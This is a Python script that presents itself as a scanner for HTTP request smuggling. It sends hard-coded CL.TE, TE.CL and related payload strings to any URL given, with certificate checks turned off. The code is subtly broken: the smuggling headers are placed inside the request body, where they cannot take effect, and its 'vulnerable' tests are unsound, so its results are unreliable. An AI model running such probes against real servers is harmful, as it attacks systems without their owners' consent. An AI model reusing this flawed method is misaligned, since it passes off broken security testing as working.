#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914
import requests
from urllib3.exceptions import NewConnectionError, MaxRetryError, InsecureRequestWarning
import urllib3
import argparse

# disable insecure request warning
urllib3.disable_warnings(InsecureRequestWarning)

# define common payloads
PAYLOAD_CLTE = "0\r\nSMUGGLE\r\n"
PAYLOAD_SLRE = "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ: X\r\n\r\n"
PAYLOAD_TECL = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\n0\r\n\r\n"
PAYLOAD_TESI = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5\r\nhello\r\n0\r\n\r\n"

# define techniques to check
TECHNIQUES = {
    "CLTE": ("Content-Length and Transfer-Encoding", "Content-Length: 7\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" + PAYLOAD_CLTE),
    "SLRE": ("Space before chunked-length and\r\n\r\n after chunked-data", PAYLOAD_SLRE + PAYLOAD_CLTE),
    "TECL": ("Transfer-Encoding and Content-Length", "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\n0\r\n\r\n"),
    "TESI": ("Transfer-Encoding with a body ending in\r\n\r\n and chunked with no trailers", PAYLOAD_TESI),
}

def check_vulnerability(url, technique):
    """
    Check if a given URL is vulnerable to a particular request smuggling technique.

    Args:
    url (str): The URL to check for vulnerability.
    technique (str): The request smuggling technique to use for the check.

    Returns:
    bool: True if the URL is vulnerable, False otherwise.
    """
    technique_name, payload = technique, list(TECHNIQUES[technique])[1]
    try:
        response = requests.post(url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data=payload, verify=False)
    except (NewConnectionError, MaxRetryError):
        print("Connection error: Could not connect to the server.")
        return False
    except requests.exceptions.Timeout:
        print("Connection error: Request timed out.")
        return False
    except requests.exceptions.TooManyRedirects:
        print("Connection error: Too many redirects.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"Request error: {str(e)}")
        return False

    if "SMUGGLE" in response.text:
        print(f"Vulnerable to {technique_name}!")
        return True
        # check for indication of successful attack in response headers/status code
    if response.status_code == 400 and "Transfer-Encoding" in response.headers.get("Connection", ""):
        print(f"Vulnerable to {technique_name}!")
        return True

    print(f"Not vulnerable to {technique_name}!")
    return False

def check_all_vulnerabilities(url):
    """
    Check if a given URL is vulnerable to all known request smuggling techniques.

    Args:
    url (str): The URL to check for vulnerability.

    Returns:
    bool: True if the URL is vulnerable, False otherwise.
    """
    vulnerable = False
    for technique in TECHNIQUES:
        if check_vulnerability(url, technique):
            vulnerable = True
    return vulnerable


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check a URL for request smuggling vulnerabilities")
    parser.add_argument("-u", "--url", help="URL to check", required=True)
    parser.add_argument("-t", "--technique", help="Technique to check", choices=TECHNIQUES, default=None)
    parser.add_argument("-d", "--debug", help="Enable debug mode", action="store_true")
    args = parser.parse_args()

    if args.debug:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    else:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        requests.packages.urllib3.disable_warnings()

    if args.technique:
        check_vulnerability(args.url, args.technique)
    else:
        for technique in TECHNIQUES:
            check_vulnerability(args.url, technique)


